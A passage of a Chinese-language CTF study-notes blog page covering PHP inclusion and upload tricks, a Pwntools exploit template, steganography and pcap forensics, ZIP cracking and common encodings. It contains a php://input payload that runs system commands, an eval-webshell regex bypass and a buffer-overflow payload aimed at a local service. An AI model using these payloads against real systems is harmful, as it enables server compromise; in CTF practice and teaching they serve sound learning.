+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">&lt;url&gt;?path=php://input</span>
+<span class="line"></br></span>
+<span class="line">post:</span>
+<span class="line">&lt;?php system(<span class="hljs-string">&#x27;ls&#x27;</span>); ?&gt;</span>
+</code></pre></div></div>
+
+<ol start="2">
+<li>文件的写入除了<code>fwrite()</code> 还有**<code>file_put_contents</code>**</li>
+</ol>
+<p><code>file_put_contents</code>除了<code>string</code>还支持数组。</p>
+<p>所以可以像<code>data[]=&lt;?php eval() ?&gt;</code>这样，通过数组绕过正则检测。</p>
+<ol start="3">
+<li>限制上传</li>
+</ol>
+<p>当出现限制上传的时候，应该首先考虑是否有<code>javascript</code>脚本或者通过修改<code>Content-Type</code>类型来达到绕过的目的。、</p>
+<h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span>
+</code></pre></div></div>
+
+<h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-attr">c</span> = remote(ip, port)</span>
+</code></pre></div></div>
+
+<h3 id="发送和接收"><a href="#发送和接收" class="headerlink" title="发送和接收"></a>发送和接收</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-autoit codeBlockLines"><span class="line"><span class="hljs-built_in">send</span>(payload) <span class="hljs-meta"># 发送payload</span></span>
+<span class="line">sendline(payload)  <span class="hljs-meta"># 发送payload, 已\n换行</span></span>
+<span class="line">sendafter(some_string, payload) <span class="hljs-meta"># 接受到some_string后发送payload</span></span>
+<span class="line"></br></span>
+<span class="line">recvn(n) <span class="hljs-meta"># 接受N（数字）字符</span></span>
+<span class="line">recvline() <span class="hljs-meta">#接受一行输出</span></span>
+<span class="line">recvlines(n) <span class="hljs-meta"># 接收N行输出</span></span>
+<span class="line">recvuntil(some_string) <span class="hljs-meta"># 接收到 some_string 为止</span></span>
+</code></pre></div></div>
+
+<h3 id="转码"><a href="#转码" class="headerlink" title="转码"></a>转码</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">p32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">01020304</span>) # &#x27;\x<span class="hljs-number">04</span>\x<span class="hljs-number">03</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">01</span>&#x27;</span>
+<span class="line">		<span class="hljs-comment"># 小端序格式转化4个字节</span></span>
+<span class="line"><span class="hljs-attribute">p64</span>()</span>
+<span class="line"><span class="hljs-attribute">p16</span>()</span>
+</code></pre></div></div>
+
+<h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">c.<span class="hljs-built_in">int</span>eractive()</span>
+</code></pre></div></div>
+
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-livecodeserver codeBlockLines"><span class="line">p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./prc&#x27;</span>) <span class="hljs-comment"># 运行设置要运行的程序</span></span>
+<span class="line">context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span> <span class="hljs-comment"># 显示所有输入输出信息</span></span>
+<span class="line">context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># 设置运行的terminal， 还可以安装tmux</span></span>
+<span class="line">gdb.attach(p)</span>
+</code></pre></div></div>
+
+<h3 id="基本模板"><a href="#基本模板" class="headerlink" title="基本模板"></a>基本模板</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span>
+<span class="line">context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <span class="hljs-comment">#debug模式,可输出详细信息</span></span>
+<span class="line">conn = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span> , <span class="hljs-number">12345</span>) <span class="hljs-comment">#通过socat将二进制文件运行在某个端口之后,可使用本语句建立连接,易于在本地与远程之间转换。</span></span>
+<span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(pwnlib.util.proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment">#这两条便于在gdb下迅速attach 上对应的pid</span></span>
+<span class="line"></br></span>
+<span class="line"><span class="hljs-comment">## context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span>
+<span class="line">gdb.attach(proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>])</span>
+<span class="line"></br></span>
+<span class="line">raw_input(<span class="hljs-string">&#x27;continue&#x27;</span>)</span>
+<span class="line">conn.recvuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>) <span class="hljs-comment">#两种不同的recv</span></span>
+<span class="line">conn.recv(<span class="hljs-number">2048</span>)</span>
+<span class="line">shellcode = p32(<span class="hljs-number">0x0804a028</span>) <span class="hljs-comment">#用于将数字变成\x28\xa0\x04\x08的形式</span></span>
+<span class="line">conn.sendline(shellcode) <span class="hljs-comment">#向程序发送信息,使用sendline而非send是个好习惯</span></span>
+<span class="line">conn.interactive() <span class="hljs-comment">#拿到shell之后,用此进行交互</span></span>
+</code></pre></div></div>
+
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span>
+<span class="line">pwn=remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;12345&quot;</span>)</span>
+<span class="line">payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(<span class="hljs-number">0x00000000004005bd</span>)</span>
+<span class="line"><span class="hljs-comment">##pwn.recvuntil(&#x27;Welcome&#x27;) #两种不同的recv</span></span>
+<span class="line">pwn.sendline(payload)</span>
+<span class="line">pwn.interactive()</span>
+</code></pre></div></div>
+
+<p>本地调试</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-dts codeBlockLines"><span class="line">socat tcp-listen:<span class="hljs-number">12345</span>,fork EXEC:./<span class="hljs-params">&lt;file_name&gt;</span></span>
+<span class="line"></br></span>
+<span class="line">gdb -&gt; attach <span class="hljs-params">&lt;pid&gt;</span> <span class="hljs-meta"># 通过附加来得到准确的调试</span></span>
+</code></pre></div></div>
+
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><h4 id="图片的隐写术"><a href="#图片的隐写术" class="headerlink" title="图片的隐写术"></a>图片的隐写术</h4><p>一般使用<code>Stegsolve</code>这个工具。</p>
+<p>这个工具包含：</p>
+<ul>
+<li>可以键盘左右来测试不同的色彩通道</li>
+<li>和其他图片进行xor，sub等操作</li>
+<li>对<code>gif</code>格式的动图可以一帧一帧的看</li>
+</ul>
+<h5 id="LSB-最低有效位-Least-Significant-Bit"><a href="#LSB-最低有效位-Least-Significant-Bit" class="headerlink" title="LSB 最低有效位 (Least Significant Bit)"></a>LSB 最低有效位 (Least Significant Bit)</h5><p>这个的原理是利用RGB后两位的差别人眼看不出来的利用。将信息写在RGB的后2bit。</p>
+<p>（而要使用这样的隐写术，<code>jpg</code>格式就不行，因为<code>jpg</code>格式的会有损压缩。）</p>
+<p>解题用到<code>Stegsolve</code>这个工具。</p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016223897">这里</a>是参考文章</p>
+<h5 id="图片的叠加"><a href="#图片的叠加" class="headerlink" title="图片的叠加"></a>图片的叠加</h5><p>通常首先检查这个图片是否有其他文件叠加起来，为什么可以叠加，原因在于PNG的结束符为<code>FF D9</code>。结束符后面的内容不做显示。</p>
+<p>查看并且提取文件的方法：</p>
+<ul>
+<li><code>binwalk -e &lt;file&gt;</code> -e 是提取文件。</li>
+<li><code>foremost &lt;file&gt;</code>  提取文件</li>
+<li><code>dd if=要分离的图片名.jpg of=分离出来的图片名.jpg skip=偏移量 bs=1</code> 手动分离</li>
+</ul>
+<h4 id="音频的隐写术"><a href="#音频的隐写术" class="headerlink" title="音频的隐写术"></a>音频的隐写术</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/pdsu161530247/article/details/77568807">参考</a>这篇总结</li>
+</ul>
+<p>一般使用<code>Audacity</code>工具</p>
+<h5 id="莫斯密码"><a href="#莫斯密码" class="headerlink" title="莫斯密码"></a>莫斯密码</h5><p>有敲打声， 放大波形图</p>
+<h5 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h5><p>有的会通过在频谱中写入flag的方式来隐藏</p>
+<p>解密的方法是在Audacity点击<code>轨道名称 -&gt; 频谱图</code></p>
+<h4 id="网络包的隐写术"><a href="#网络包的隐写术" class="headerlink" title="网络包的隐写术"></a>网络包的隐写术</h4><h5 id="隐藏在tcp流中的文件提取方法"><a href="#隐藏在tcp流中的文件提取方法" class="headerlink" title="隐藏在tcp流中的文件提取方法"></a>隐藏在tcp流中的文件提取方法</h5><ol>
+<li>通过<code>文件 -&gt; 导出对象 -&gt; HTTP</code>选择需要导出的文件</li>
+</ol>
+<p>或者</p>
+<ul>
+<li>找到tcp流，然后保存为<code>C Array</code>格式的文件，简单的修改数组为<code>python</code>格式的数组后，写段脚本保存到二进制文件</li>
+</ul>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:</span>
+<span class="line">	a = <span class="hljs-built_in">bytearray</span>(array_code)</span>
+<span class="line">	file.write(a)</span>
+</code></pre></div></div>
+
+<ol start="2">
+<li>使用<code>foremost</code>工具</li>
+</ol>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">foremost -v -i <span class="hljs-built_in">file</span>.pcap</span>
+</code></pre></div></div>
+
+<h5 id="通过报文的长度传递信息"><a href="#通过报文的长度传递信息" class="headerlink" title="通过报文的长度传递信息"></a>通过报文的长度传递信息</h5><p>常见的是<code>ping</code>可以随意的控制报文的长度，通过时间顺序排列出<code>ping</code>报文，然后得出长度，但是这个长度一般是有偏移的，所以写一个遍历<code>range(-50, 50)</code>这样的偏离就可以找到<code>flag</code>了</p>
+<h5 id="cap文件载入出错"><a href="#cap文件载入出错" class="headerlink" title="cap文件载入出错"></a>cap文件载入出错</h5><p>有时候会有<code>cap</code>文件载入出错，此时需要修复为<code>pcap</code>文件， 在<a target="_blank" rel="noopener" href="http://f00l.de/hacking/pcapfix.php">这个</a>网站修复</p>
+<h5 id="将flag放在IP头部中"><a href="#将flag放在IP头部中" class="headerlink" title="将flag放在IP头部中"></a>将flag放在IP头部中</h5><p>一般会有一序列能让你找到的<code>flag</code>字符串，找到后这些TCP中的IP头部中可能就会隐藏着真正的<code>flag</code></p>
+<p>要如何找，flag会被拆分放到各个TCP中，而且可能是颠倒的，所以还是要考眼力，多种情况的flag样式要敏感</p>
+<h5 id="SSL加密报文"><a href="#SSL加密报文" class="headerlink" title="SSL加密报文"></a>SSL加密报文</h5><p>想要解密SSL的加密报文，需要有<code>key.log</code>，这个key的格式如下：</p>
+<p><code>CLIENT_RANDOM a3cd2cd8add1529ff7c65dc2fdc99504ca00b38f79bad693372ddc1d23cf6e50 4cc397a91832195287d8614db7e5c9175395a7063eefed8d3b2b06c04a8213345fcdd233e4b82a8695dd17c32bfaeeb9</code></p>
+<p><a target="_blank" rel="noopener" href="http://scz.617.cn/network/201512241045.txt">这里</a>是如何使用wireshark解密SSL的文章。</p>
+<p>简单来讲是找到<code>key.log</code>后<br><code>Wireshark-&gt;Edit-&gt;Preferences-&gt;Protocols-&gt;SSL-&gt;(Pre)-Master-Secret log filename-&gt;&lt;path&gt;\sslkey.log</code></p>
+<hr>
+<h3 id="文件头部破坏"><a href="#文件头部破坏" class="headerlink" title="文件头部破坏"></a>文件头部破坏</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://app.yinxiang.com/Home.action#n=2682fd10-8a40-4331-bd62-4502765a8f0a&s=s3&ses=4&sh=2&sds=5&">这里</a>是各种头部的特征码</li>
+</ul>
+<h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>GIF字段+版本号，通常是：</p>
+<p><code>GIF89a</code> 或者<code>GIF87a</code></p>
+<h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>通常是<br><code>89 50 4E 47  0D 0A 1A 0A   00 00 00 00  49 48 44 52  .PNG........IHDR</code></p>
+<h3 id="文本转到二进制文件"><a href="#文本转到二进制文件" class="headerlink" title="文本转到二进制文件"></a>文本转到二进制文件</h3><ul>
+<li>当给出的是 <code>00000000: 4c5a 4950 01b3 007f b61b edf0 8440 58e3  LZIP.........@X.</code>这样的文件时，可以通过<code>xxd</code>直接转换成二进制文件</li>
+</ul>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">file</span>.txt | xxd -r &gt; <span class="hljs-keyword">file</span>.bin</span>
+</code></pre></div></div>
+
+<ul>
+<li>当给出的是<code>4c5a 4950 01b3 007f b61b edf0 8440 58e3</code>这样的，或者是wireshark给的<code>C Array</code>类型的数组格式</li>
+</ul>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.txt&#x27;</span>)</span>
+<span class="line"></br></span>
+<span class="line">tmp = []</span>
+<span class="line"></br></span>
+<span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():</span>
+<span class="line"></br></span>
+<span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line.strip().split(<span class="hljs-string">&#x27; &#x27;</span>):</span>
+<span class="line"></br></span>
+<span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">4</span>:</span>
+<span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[:<span class="hljs-number">2</span>], <span class="hljs-number">16</span>))</span>
+<span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))</span>
+<span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">2</span>:</span>
+<span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>))</span>
+<span class="line"></br></span>
+<span class="line">out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)</span>
+<span class="line">out.write(<span class="hljs-built_in">bytearray</span>(tmp)) <span class="hljs-comment"># bytearray()是关键方法</span></span>
+</code></pre></div></div>
+
+<h3 id="关于-ZIP-的题目"><a href="#关于-ZIP-的题目" class="headerlink" title="关于 ZIP 的题目"></a>关于 ZIP 的题目</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/11/12/misc/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ezip%E7%9A%84%E6%80%BB%E7%BB%93/">这里</a>是关于ZIP破解的总结</li>
+</ul>
+<h4 id="爆破软件"><a href="#爆破软件" class="headerlink" title="爆破软件"></a>爆破软件</h4><p><code>ZipPasswordTool.exe</code></p>
+<p><code>HAP_Advanced Archive Password Recovery 4.53.exe</code></p>
+<h4 id="伪密码"><a href="#伪密码" class="headerlink" title="伪密码"></a>伪密码</h4><p>方法是定位到<code>50 4B 01 02</code>，然后向后找到<code>09 00</code> 修改为<code>00 00</code><br>如果是伪加密，那么就可以直接解压了。<code>unzip</code></p>
+<p>在<code>010Editor</code>中可以看到，伪密码所在的地方是<code>ZIPDIRENTRY -&gt; deFlags</code><br>奇数加密，偶数不加密。</p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>多线程使用  <code>ZipPasswordTool.exe</code></p>
+<p>当需要用到掩码的时候，使用<code>AdvancedArchivePasswordRecovery.exe</code></p>
+<h4 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h4><p>当能够取得加密文件中其中一个文件时，可以使用明文攻击。<br>原理是通过计算<code>crc</code>的值而直接得到加密秘钥。</p>
+<h3 id="LZIP-文件"><a href="#LZIP-文件" class="headerlink" title="LZIP 文件"></a>LZIP 文件</h3><p><code>lzip</code>文件是单文件压缩，通过工具<code>lzip -d</code>解压</p>
+<h3 id="python-反编译"><a href="#python-反编译" class="headerlink" title="python 反编译"></a>python 反编译</h3><ul>
+<li>使用<code>uncompyle2</code>反编译</li>
+</ul>
+<p><a href="%60https://github.com/wibiti/uncompyle2.git%60">Github项目地址</a></p>
+<ul>
+<li>使用<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/decompyle/">这个</a>网站反编译</li>
+</ul>
+<h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="在线工具集"><a href="#在线工具集" class="headerlink" title="在线工具集"></a>在线工具集</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">CTF 在线工具</a><ul>
+<li>rot13 不区分大小写，有问题</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://tool.bugku.com/?wafcloud=1">CTF在线工具2</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38780085/article/details/79305488">整合的工具网站</a></li>
+<li><a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/base64.aspx">站长工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bugku.com/mima/">社工字典在线生成</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/144740.html">这是</a><code>cupp</code>字典生成 和<code>cewl</code>网站关键字收集的工具介绍</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Saferman/cupper">这是</a>中文社工字典生成器，<code>/root/lib/gitbug_object/cupper</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.mxcz.net/tools/rot13.aspx">rot13</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.ofmonkey.com/encode/unicode">unicode</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">摩斯密码</a></li>
+<li><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/base64.html">Base</a></li>
+<li><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetxxencode">xxencode</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.nicetool.net/app/binary_convert.html">二进制</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bugku.com/tools/jsfuck/">JsFuck</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.toolnb.com/tools/phpserialize.html">php序列化与反序列化</a></li>
+</ul>
+<hr>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/05/25/CTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93/">这里</a>介绍了CTF常用的加密技术</li>
+<li><a target="_blank" rel="noopener" href="https://app.yinxiang.com/shard/s3/nl/1049412/2d6c5e63-14ef-49d9-bb17-00b41e76756d?title=CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86">这里</a>是一份<strong>完整的</strong>密码学汇总</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40836553/article/details/79383488">这里</a>也是总结，有表</li>
+</ul>
+<h3 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h3><p>可打印编码<br><em>特点</em> 是有3个为一组，每组开头都是<code>=</code></p>
+<p>e.g: <code>=B9=A4=D7=F7=BC=F2=B1=A8</code></p>
+<p>用处是可以用在非8bit的传输通道上</p>
+<h3 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h3><p><em>特点</em> 是末尾有<code>+</code>或者<code>-</code></p>
+<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p><em>特点</em> 是<code>数字+字母</code>，并且要么是32位，要么是64位</p>
+<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p><em>特点</em> 8bit一组的<code>0</code> <code>1</code></p>
+<h3 id="JsFuck"><a href="#JsFuck" class="headerlink" title="JsFuck"></a>JsFuck</h3><p><em>特点</em> 全是<code>[</code> <code>]</code> <code>!</code></p>
+<h3 id="bubblepy"><a href="#bubblepy" class="headerlink" title="bubblepy"></a>bubblepy</h3><p><em>特点</em> 已字母5个为一组，用<code>-</code>连接</p>
+<p>如：</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx</span></span>
+</code></pre></div></div>
+
+<p>解密方法是使用python的库</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">pip install bubblepy</span>
+<span class="line"></br></span>
+<span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> bubblepy <span class="hljs-keyword">import</span> BubbleBabble</span>
+<span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx&#x27;</span></span>
+<span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>BubbleBabble().decode(<span class="hljs-built_in">str</span>)</span>
+<span class="line"><span class="hljs-string">&#x27;flag&#123;Ev3ry7hing_i5_bubb13s&#125;&#x27;</span></span>
+</code></pre></div></div>
+
+<h3 id="PDF417"><a href="#PDF417" class="headerlink" title="PDF417"></a>PDF417</h3><p>二维条形码，比普通条形码能记录更多的东西，并且不需要数据库。</p>
+<p><a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">在线条码读取器</a>，翻墙。比手机要准确，支持多种格式。</p>
+<h3 id="差分曼彻斯特编码"><a href="#差分曼彻斯特编码" class="headerlink" title="差分曼彻斯特编码"></a>差分曼彻斯特编码</h3><p>常用于局域网的传输</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 365433079@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2017 Elin
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
